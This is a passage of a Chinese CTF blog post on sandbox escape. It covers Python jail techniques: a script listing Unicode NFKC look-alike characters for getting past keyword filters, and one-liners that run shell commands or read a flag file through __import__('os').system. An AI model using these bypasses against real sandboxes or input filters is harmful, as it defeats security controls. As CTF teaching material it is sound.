<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>Misc-æ²™ç®±é€ƒé€¸ - âš¡Lunatic BLOGâš¡</title><meta name=author content="Lunatic"><meta name=description content="è¿™ç¯‡åšå®¢ç”¨æ¥è®°å½•ä¸€ä¸‹æ²™ç®±é€ƒé€¸ç›¸å…³çš„ä¸€äº›çŸ¥è¯†ç‚¹
"><meta name=keywords content='Misc,CTF'><meta itemprop=name content="Misc-æ²™ç®±é€ƒé€¸"><meta itemprop=description content="è¿™ç¯‡åšå®¢ç”¨æ¥è®°å½•ä¸€ä¸‹æ²™ç®±é€ƒé€¸ç›¸å…³çš„ä¸€äº›çŸ¥è¯†ç‚¹"><meta itemprop=datePublished content="2023-08-22T22:34:46+08:00"><meta itemprop=dateModified content="2023-08-22T22:34:46+08:00"><meta itemprop=wordCount content="1067"><meta itemprop=keywords content="Misc,CTF"><meta property="og:url" content="https://goodlunatic.github.io/posts/442fd1d/"><meta property="og:site_name" content="âš¡Lunatic BLOGâš¡"><meta property="og:title" content="Misc-æ²™ç®±é€ƒé€¸"><meta property="og:description" content="è¿™ç¯‡åšå®¢ç”¨æ¥è®°å½•ä¸€ä¸‹æ²™ç®±é€ƒé€¸ç›¸å…³çš„ä¸€äº›çŸ¥è¯†ç‚¹"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-08-22T22:34:46+08:00"><meta property="article:modified_time" content="2023-08-22T22:34:46+08:00"><meta property="article:tag" content="Misc"><meta property="article:tag" content="CTF"><meta name=twitter:card content="summary"><meta name=twitter:title content="Misc-æ²™ç®±é€ƒé€¸"><meta name=twitter:description content="è¿™ç¯‡åšå®¢ç”¨æ¥è®°å½•ä¸€ä¸‹æ²™ç®±é€ƒé€¸ç›¸å…³çš„ä¸€äº›çŸ¥è¯†ç‚¹"><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical type=text/html href=https://goodlunatic.github.io/posts/442fd1d/ title="Misc-æ²™ç®±é€ƒé€¸ - âš¡Lunatic BLOGâš¡"><link rel=prev type=text/html href=https://goodlunatic.github.io/posts/5e91e89/ title=CTF-Pwnå­¦ä¹ è®°å½•><link rel=next type=text/html href=https://goodlunatic.github.io/posts/940b876/ title="2023 ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ› Misc Writeup"><link rel=alternate type=text/markdown href=https://goodlunatic.github.io/posts/442fd1d/index.md title="Misc-æ²™ç®±é€ƒé€¸ - âš¡Lunatic BLOGâš¡"><link rel=stylesheet href=/css/config.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Misc-æ²™ç®±é€ƒé€¸","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/goodlunatic.github.io\/posts\/442fd1d\/"},"genre":"posts","keywords":"Misc, CTF","wordcount":1067,"url":"https:\/\/goodlunatic.github.io\/posts\/442fd1d\/","datePublished":"2023-08-22T22:34:46+08:00","dateModified":"2023-08-22T22:34:46+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Lunatic"},"description":""}</script><script src=/js/head/color-scheme.min.js></script></head><body data-header-desktop=sticky data-header-mobile=auto><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper data-github-corner=left><div class=header-title><a href=/ title="âš¡Lunatic BLOGâš¡"><span class=header-title-text>âš¡Lunatic BLOGâš¡</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> åˆé›†</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> å½’æ¡£</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> åˆ†ç±»</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> æ ‡ç­¾</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> å‹é“¾</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> å…³äº</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id=search-desktop><input type=text placeholder=æœç´¢æ–‡ç« æ ‡é¢˜æˆ–å†…å®¹â€¦â€¦ id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=æœç´¢><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=æ¸…ç©º><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></li><li class="menu-item theme-switch" title=åˆ‡æ¢ä¸»é¢˜><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="âš¡Lunatic BLOGâš¡"><span class=header-title-text>âš¡Lunatic BLOGâš¡</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=æœç´¢æ–‡ç« æ ‡é¢˜æˆ–å†…å®¹â€¦â€¦ id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=æœç´¢><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=æ¸…ç©º><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>å–æ¶ˆ</a></li><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> åˆé›†</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> å½’æ¡£</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> åˆ†ç±»</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> æ ‡ç­¾</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> å‹é“¾</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> å…³äº</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title=åˆ‡æ¢ä¸»é¢˜><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=fi-container><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label=åˆé›†><div class="details collection-details open"><div class="details-summary collection-summary"><i class="fa-solid fa-layer-group fa-fw" aria-hidden=true></i>
<span class=collection-name title=åˆé›†>CTF-Miscå…¥é—¨æŒ‡å—</span>
<span class=collection-count>8</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content collection-content"><nav><ul class=collection-list><li class=collection-item><a href=/posts/1ad9200/ title="[æŒç»­æ›´æ–°] CTF-Misc Guide">[æŒç»­æ›´æ–°] CTF-Misc Guide</a></li><li class=collection-item><a href=/posts/c5bc8a2/ title=Misc-AIå®‰å…¨>Misc-AIå®‰å…¨</a></li><li class=collection-item><a href=/posts/761da51/ title=Misc-æ•°å­—å–è¯>Misc-æ•°å­—å–è¯</a></li><li class=collection-item><a href=/posts/5422d65/ title=Misc-æµé‡åˆ†æ>Misc-æµé‡åˆ†æ</a></li><li class=collection-item><a href=/posts/c49ae8a/ title=Misc-æ•°æ®å®‰å…¨>Misc-æ•°æ®å®‰å…¨</a></li><li class=collection-item><a href=/posts/01ebd40/ title=Misc-å·¥æ§å®‰å…¨>Misc-å·¥æ§å®‰å…¨</a></li><li class=collection-item><span class=active title=Misc-æ²™ç®±é€ƒé€¸>Misc-æ²™ç®±é€ƒé€¸</span></li><li class=collection-item><a href=/posts/3e9e231/ title=Misc-åŒºå—é“¾å®‰å…¨>Misc-åŒºå—é“¾å®‰å…¨</a></li></ul><div class=collection-nav-simple><a href=/posts/01ebd40/ class=collection-nav-item rel=prev title=Misc-å·¥æ§å®‰å…¨><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i></a><span class=text-secondary>7/8</span><a href=/posts/3e9e231/ class=collection-nav-item rel=next title=Misc-åŒºå—é“¾å®‰å…¨><i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></nav></div></div><div class="details related-details open"><div class="details-summary related-summary"><i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden=true></i>
<span class=related-title>ç›¸å…³å†…å®¹</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content related-content"><ul class=related-list><li class=related-item><a href=/posts/3e9e231/ title=Misc-åŒºå—é“¾å®‰å…¨>Misc-åŒºå—é“¾å®‰å…¨</a></li><li class=related-item><a href=/posts/5e91e89/ title=CTF-Pwnå­¦ä¹ è®°å½•>CTF-Pwnå­¦ä¹ è®°å½•</a></li><li class=related-item><a href=/posts/d7eced5/ title=CTF-Pwnåˆ·é¢˜è®°å½•>CTF-Pwnåˆ·é¢˜è®°å½•</a></li><li class=related-item><a href=/posts/3f7db4e/ title="2022 æµ™æ±Ÿçœå¤§å­¦ç”Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ› Writeup">2022 æµ™æ±Ÿçœå¤§å­¦ç”Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ› Writeup</a></li></ul></div></div><div class=aside-custom><a href target=_blank rel=external><img src=/images/zsxq.webp alt="Lunatic Planet QR code" width=100%></a></div></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span title=è½¬è½½ class=icon-repost><i class="fa-solid fa-share fa-fw" aria-hidden=true></i></span><span>Misc-æ²™ç®±é€ƒé€¸</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://goodlunatic.github.io title=ä½œè€… target=_blank rel="external nofollow noopener noreferrer author" class=author><img class=avatar src=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png alt=Lunatic height=16 width=16>&nbsp;Lunatic</a></span><span class=post-included-in>&nbsp;æ”¶å½•äº <a href=/categories/ctf/ class=post-category title="åˆ†ç±» - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> CTF</a> å’Œ <a href=/collections/ctf-misc%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/ class=post-collection title="åˆé›† - CTF-Miscå…¥é—¨æŒ‡å—"><i class="fa-solid fa-layer-group fa-fw" aria-hidden=true></i> CTF-Miscå…¥é—¨æŒ‡å—</a></span></div><div class=post-meta-line><span title="å‘å¸ƒäº 2023-08-22 22:34:46"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden=true></i><time datetime=2023-08-22>2023-08-22</time></span>&nbsp;<span title="1067 å­—"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>çº¦ 1100 å­—</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>é¢„è®¡é˜…è¯» 6 åˆ†é’Ÿ</span>&nbsp;<span id=busuanzi_container_page_pv class="busuanzi_visitors comment-visitors" data-flag-title=Misc-æ²™ç®±é€ƒé€¸><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_page_pv>-</span>&nbsp;æ¬¡é˜…è¯»
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>ç›®å½•</span>
<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#python-æ²™ç®±é€ƒé€¸pyjail>Python æ²™ç®±é€ƒé€¸(pyjail)</a><ul><li><a href=#å¸¸è§çš„ç»•è¿‡æ–¹æ³•>å¸¸è§çš„ç»•è¿‡æ–¹æ³•</a></li></ul></li><li><a href=#vmæ²™ç®±é€ƒé€¸>VMæ²™ç®±é€ƒé€¸</a><ul><li><a href=#vmæ²™ç®±é€ƒé€¸-1>VMæ²™ç®±é€ƒé€¸</a></li><li><a href=#vm2æ²™ç®±é€ƒé€¸>VM2æ²™ç®±é€ƒé€¸</a></li><li><a href=#ç¤ºä¾‹é¢˜ç›®>ç¤ºä¾‹é¢˜ç›®</a><ul><li><a href=#ä¾‹é¢˜-2023hznuctf-eznode>ä¾‹é¢˜-2023HZNUCTF eznode</a></li></ul></li></ul></li></ul></nav></div></div><div class=content id=content><p><strong>è¿™ç¯‡åšå®¢ç”¨æ¥è®°å½•ä¸€ä¸‹æ²™ç®±é€ƒé€¸ç›¸å…³çš„ä¸€äº›çŸ¥è¯†ç‚¹</strong></p><h2 class=heading-element id=python-æ²™ç®±é€ƒé€¸pyjail><span>Python æ²™ç®±é€ƒé€¸(pyjail)</span>
<a href=#python-%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8pyjail class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>è·å–å¸¸ç”¨çš„unicodeç¢°æ’å­—ç¬¦</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>unicodedata</span> <span class=kn>import</span> <span class=n>normalize</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>string</span> <span class=kn>import</span> <span class=n>ascii_lowercase</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>defaultdict</span>
</span></span><span class=line><span class=cl><span class=n>lst</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>ascii_lowercase</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dic</span> <span class=o>=</span> <span class=n>defaultdict</span><span class=p>(</span><span class=nb>list</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>lst</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x110000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>normalize</span><span class=p>(</span><span class=s2>&#34;NFKC&#34;</span><span class=p>,</span> <span class=nb>chr</span><span class=p>(</span><span class=n>i</span><span class=p>))</span> <span class=o>==</span> <span class=n>char</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dic</span><span class=p>[</span><span class=n>char</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>dic</span><span class=p>[</span><span class=n>char</span><span class=p>])</span> <span class=o>&gt;</span> <span class=mi>9</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>key</span><span class=p>,</span><span class=n>value</span> <span class=ow>in</span> <span class=n>dic</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=n>value</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a [&#39;a&#39;, &#39;Âª&#39;, &#39;áµƒ&#39;, &#39;â‚&#39;, &#39;â“&#39;, &#39;ï½&#39;, &#39;ğš&#39;, &#39;ğ‘&#39;, &#39;ğ’‚&#39;, &#39;ğ’¶&#39;]
</span></span><span class=line><span class=cl>b [&#39;b&#39;, &#39;áµ‡&#39;, &#39;â“‘&#39;, &#39;ï½‚&#39;, &#39;ğ›&#39;, &#39;ğ‘&#39;, &#39;ğ’ƒ&#39;, &#39;ğ’·&#39;, &#39;ğ“«&#39;, &#39;ğ”Ÿ&#39;]
</span></span><span class=line><span class=cl>c [&#39;c&#39;, &#39;á¶œ&#39;, &#39;â…½&#39;, &#39;â“’&#39;, &#39;ï½ƒ&#39;, &#39;ğœ&#39;, &#39;ğ‘&#39;, &#39;ğ’„&#39;, &#39;ğ’¸&#39;, &#39;ğ“¬&#39;]
</span></span><span class=line><span class=cl>d [&#39;d&#39;, &#39;áµˆ&#39;, &#39;â…†&#39;, &#39;â…¾&#39;, &#39;â““&#39;, &#39;ï½„&#39;, &#39;ğ&#39;, &#39;ğ‘‘&#39;, &#39;ğ’…&#39;, &#39;ğ’¹&#39;]
</span></span><span class=line><span class=cl>e [&#39;e&#39;, &#39;áµ‰&#39;, &#39;â‚‘&#39;, &#39;â„¯&#39;, &#39;â…‡&#39;, &#39;â“”&#39;, &#39;ï½…&#39;, &#39;ğ&#39;, &#39;ğ‘’&#39;, &#39;ğ’†&#39;]
</span></span><span class=line><span class=cl>f [&#39;f&#39;, &#39;á¶ &#39;, &#39;â“•&#39;, &#39;ï½†&#39;, &#39;ğŸ&#39;, &#39;ğ‘“&#39;, &#39;ğ’‡&#39;, &#39;ğ’»&#39;, &#39;ğ“¯&#39;, &#39;ğ”£&#39;]
</span></span><span class=line><span class=cl>g [&#39;g&#39;, &#39;áµ&#39;, &#39;â„Š&#39;, &#39;â“–&#39;, &#39;ï½‡&#39;, &#39;ğ &#39;, &#39;ğ‘”&#39;, &#39;ğ’ˆ&#39;, &#39;ğ“°&#39;, &#39;ğ”¤&#39;]
</span></span><span class=line><span class=cl>h [&#39;h&#39;, &#39;Ê°&#39;, &#39;â‚•&#39;, &#39;â„&#39;, &#39;â“—&#39;, &#39;ï½ˆ&#39;, &#39;ğ¡&#39;, &#39;ğ’‰&#39;, &#39;ğ’½&#39;, &#39;ğ“±&#39;]
</span></span><span class=line><span class=cl>i [&#39;i&#39;, &#39;áµ¢&#39;, &#39;â±&#39;, &#39;â„¹&#39;, &#39;â…ˆ&#39;, &#39;â…°&#39;, &#39;â“˜&#39;, &#39;ï½‰&#39;, &#39;ğ¢&#39;, &#39;ğ‘–&#39;]
</span></span><span class=line><span class=cl>j [&#39;j&#39;, &#39;Ê²&#39;, &#39;â…‰&#39;, &#39;â“™&#39;, &#39;â±¼&#39;, &#39;ï½Š&#39;, &#39;ğ£&#39;, &#39;ğ‘—&#39;, &#39;ğ’‹&#39;, &#39;ğ’¿&#39;]
</span></span><span class=line><span class=cl>k [&#39;k&#39;, &#39;áµ&#39;, &#39;â‚–&#39;, &#39;â“š&#39;, &#39;ï½‹&#39;, &#39;ğ¤&#39;, &#39;ğ‘˜&#39;, &#39;ğ’Œ&#39;, &#39;ğ“€&#39;, &#39;ğ“´&#39;]
</span></span><span class=line><span class=cl>l [&#39;l&#39;, &#39;Ë¡&#39;, &#39;â‚—&#39;, &#39;â„“&#39;, &#39;â…¼&#39;, &#39;â“›&#39;, &#39;ï½Œ&#39;, &#39;ğ¥&#39;, &#39;ğ‘™&#39;, &#39;ğ’&#39;]
</span></span><span class=line><span class=cl>m [&#39;m&#39;, &#39;áµ&#39;, &#39;â‚˜&#39;, &#39;â…¿&#39;, &#39;â“œ&#39;, &#39;ï½&#39;, &#39;ğ¦&#39;, &#39;ğ‘š&#39;, &#39;ğ’&#39;, &#39;ğ“‚&#39;]
</span></span><span class=line><span class=cl>n [&#39;n&#39;, &#39;â¿&#39;, &#39;â‚™&#39;, &#39;â“&#39;, &#39;ï½&#39;, &#39;ğ§&#39;, &#39;ğ‘›&#39;, &#39;ğ’&#39;, &#39;ğ“ƒ&#39;, &#39;ğ“·&#39;]
</span></span><span class=line><span class=cl>o [&#39;o&#39;, &#39;Âº&#39;, &#39;áµ’&#39;, &#39;â‚’&#39;, &#39;â„´&#39;, &#39;â“&#39;, &#39;ï½&#39;, &#39;ğ¨&#39;, &#39;ğ‘œ&#39;, &#39;ğ’&#39;]
</span></span><span class=line><span class=cl>p [&#39;p&#39;, &#39;áµ–&#39;, &#39;â‚š&#39;, &#39;â“Ÿ&#39;, &#39;ï½&#39;, &#39;ğ©&#39;, &#39;ğ‘&#39;, &#39;ğ’‘&#39;, &#39;ğ“…&#39;, &#39;ğ“¹&#39;]
</span></span><span class=line><span class=cl>q [&#39;q&#39;, &#39;â“ &#39;, &#39;ï½‘&#39;, &#39;ğª&#39;, &#39;ğ‘&#39;, &#39;ğ’’&#39;, &#39;ğ“†&#39;, &#39;ğ“º&#39;, &#39;ğ”®&#39;, &#39;ğ•¢&#39;]
</span></span><span class=line><span class=cl>r [&#39;r&#39;, &#39;Ê³&#39;, &#39;áµ£&#39;, &#39;â“¡&#39;, &#39;ï½’&#39;, &#39;ğ«&#39;, &#39;ğ‘Ÿ&#39;, &#39;ğ’“&#39;, &#39;ğ“‡&#39;, &#39;ğ“»&#39;]
</span></span><span class=line><span class=cl>s [&#39;s&#39;, &#39;Å¿&#39;, &#39;Ë¢&#39;, &#39;â‚›&#39;, &#39;â“¢&#39;, &#39;ï½“&#39;, &#39;ğ¬&#39;, &#39;ğ‘ &#39;, &#39;ğ’”&#39;, &#39;ğ“ˆ&#39;]
</span></span><span class=line><span class=cl>t [&#39;t&#39;, &#39;áµ—&#39;, &#39;â‚œ&#39;, &#39;â“£&#39;, &#39;ï½”&#39;, &#39;ğ­&#39;, &#39;ğ‘¡&#39;, &#39;ğ’•&#39;, &#39;ğ“‰&#39;, &#39;ğ“½&#39;]
</span></span><span class=line><span class=cl>u [&#39;u&#39;, &#39;áµ˜&#39;, &#39;áµ¤&#39;, &#39;â“¤&#39;, &#39;ï½•&#39;, &#39;ğ®&#39;, &#39;ğ‘¢&#39;, &#39;ğ’–&#39;, &#39;ğ“Š&#39;, &#39;ğ“¾&#39;]
</span></span><span class=line><span class=cl>v [&#39;v&#39;, &#39;áµ›&#39;, &#39;áµ¥&#39;, &#39;â…´&#39;, &#39;â“¥&#39;, &#39;ï½–&#39;, &#39;ğ¯&#39;, &#39;ğ‘£&#39;, &#39;ğ’—&#39;, &#39;ğ“‹&#39;]
</span></span><span class=line><span class=cl>w [&#39;w&#39;, &#39;Ê·&#39;, &#39;â“¦&#39;, &#39;ï½—&#39;, &#39;ğ°&#39;, &#39;ğ‘¤&#39;, &#39;ğ’˜&#39;, &#39;ğ“Œ&#39;, &#39;ğ”€&#39;, &#39;ğ”´&#39;]
</span></span><span class=line><span class=cl>x [&#39;x&#39;, &#39;Ë£&#39;, &#39;â‚“&#39;, &#39;â…¹&#39;, &#39;â“§&#39;, &#39;ï½˜&#39;, &#39;ğ±&#39;, &#39;ğ‘¥&#39;, &#39;ğ’™&#39;, &#39;ğ“&#39;]
</span></span><span class=line><span class=cl>y [&#39;y&#39;, &#39;Ê¸&#39;, &#39;â“¨&#39;, &#39;ï½™&#39;, &#39;ğ²&#39;, &#39;ğ‘¦&#39;, &#39;ğ’š&#39;, &#39;ğ“&#39;, &#39;ğ”‚&#39;, &#39;ğ”¶&#39;]
</span></span><span class=line><span class=cl>z [&#39;z&#39;, &#39;á¶»&#39;, &#39;â“©&#39;, &#39;ï½š&#39;, &#39;ğ³&#39;, &#39;ğ‘§&#39;, &#39;ğ’›&#39;, &#39;ğ“&#39;, &#39;ğ”ƒ&#39;, &#39;ğ”·&#39;]</span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=å¸¸è§çš„ç»•è¿‡æ–¹æ³•><span>å¸¸è§çš„ç»•è¿‡æ–¹æ³•</span>
<a href=#%e5%b8%b8%e8%a7%81%e7%9a%84%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>__import__</span><span class=p>(</span><span class=s2>&#34;os&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;cat flag&#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>open</span><span class=p>(</span><span class=s2>&#34;flag&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
